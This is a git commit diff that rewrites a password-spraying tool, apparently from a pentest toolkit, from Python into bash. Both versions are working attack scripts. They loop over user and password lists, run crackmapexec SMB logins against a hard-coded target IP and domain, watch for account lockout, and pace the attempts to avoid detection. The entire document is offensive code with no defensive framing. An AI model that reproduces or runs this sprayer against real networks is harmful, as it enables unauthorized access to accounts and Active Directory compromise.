edef865c55b2e10284a26f557ec920068241daaf
paulkwalton <43542501+paulkwalton@users.noreply.github.com>
2023-06-28 07:11:25 +0100

    Update cmd-password-spray.sh

--- linux/passwords/cmd-password-spray.sh
+++ linux/passwords/cmd-password-spray.sh
@@ -1,75 +1,55 @@
-#!/usr/bin/env python3
+#!/bin/bash
 
-import os
-import sys
-import time
-import subprocess
-from argparse import ArgumentParser
+# Set the target IP/domain
+target="172.28.33.31"
 
-def read_list_from_file(file_path):
-    with open(file_path, 'r') as file:
-        items = [line.strip() for line in file.readlines()]
-    return items
+# Set the domain
+domain="hacked.local"
 
-import getpass
+# Initialize cycle and start time
+cycle=0
+start=$(date +%s)
 
-def password_spray(users, passwords, target, interval, domain):
-    lockout_detected = False
+# Countdown timer
+countdown() {
+   secs=$1
+   while [ $secs -gt 0 ]; do
+      echo -ne "Next cycle in: $secs\033[0K\r"
+      sleep 1
+      : $((secs--))
+   done
+}
 
-    for password in passwords:
-        if lockout_detected:
-            break
+# Get the lists of users and passwords
+users=($(cat users.txt))
+passwords=($(cat password.txt))
 
-        for user in users:
-            print(f"[*] Attempting to authenticate user {user} with password {password}")
+# Iterate over passwords
+for password in "${passwords[@]}"; do
+    # Iterate over users
+    for user in "${users[@]}"; do
+        # Run crackmapexec and capture output
+        output=$(crackmapexec smb $target -u $user -p $password -d $domain | tee /dev/fd/2)
 
-            if domain:
-                cmd = f"crackmapexec smb {target} -u {domain}/{user} -p {password}"
-            else:
-                cmd = f"crackmapexec smb {target} --local-auth -u {user} -p {password}"
-                
-            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
+        # If output contains "STATUS_ACCOUNT_LOCKED_OUT", then exit
+        if echo "$output" | grep -q "STATUS_ACCOUNT_LOCKED_OUT"; then
+            echo "Account locked out detected for user: $user. Exiting."
+            exit 1
+        fi
+    done
 
-            if "STATUS_LOGON_FAILURE" not in result.stdout and "STATUS_ACCOUNT_LOCKED_OUT" not in result.stdout:
-                print(f"\033[91m[+] Valid password found for user {user}: {password}\033[0m")
-                
-                try:
-                    user_input = getpass.getpass("Do you want to continue? (yes/no): ").lower()
-                    if user_input == "no":
-                        return
-                except EOFError:
-                    print("\nReceived EOF or premature termination. Exiting.")
-                    return
-                
-            if "STATUS_ACCOUNT_LOCKED_OUT" in result.stdout:
-                print(f"[!] Account lockout detected for user {user}. Stopping the script.")
-                lockout_detected = True
-                break
+    # Increment the cycle counter
+    ((cycle++))
 
-            time.sleep(interval)
+    # Calculate elapsed time
+    now=$(date +%s)
+    elapsed=$((now - start))
+    elapsed_minutes=$((elapsed / 60))
 
+    # Print cycle and time information
+    echo "Completed cycle: $cycle"
+    echo "Time elapsed: $elapsed_minutes minutes"
 
-
-
-
-
-def main():
-    parser = ArgumentParser(description="CrackMapExec Password Sprayer")
-    parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
-    parser.add_argument("-u", "--user-list", required=True, help="Path to a file containing a list of usernames, one per line")
-    parser.add_argument("-p", "--password-list", required=True, help="Path to a file containing a list of passwords, one per line")
-    parser.add_argument("-i", "--interval", type=int, default=600, help="Time interval between password sprays in seconds (default: 600)")
-    parser.add_argument("-d", "--domain", help="Active Directory domain name (optional)")
-
-    args = parser.parse_args()
-
-    users = read_list_from_file(args.user_list)
-    passwords = read_list_from_file(args.password_list)
-    target = args.target
-    interval = args.interval
-    domain = args.domain
-
-    password_spray(users, passwords, target, interval, domain)
-
-if __name__ == "__main__":
-    main()
+    # Sleep for 60 seconds with countdown
+    countdown 60
+done
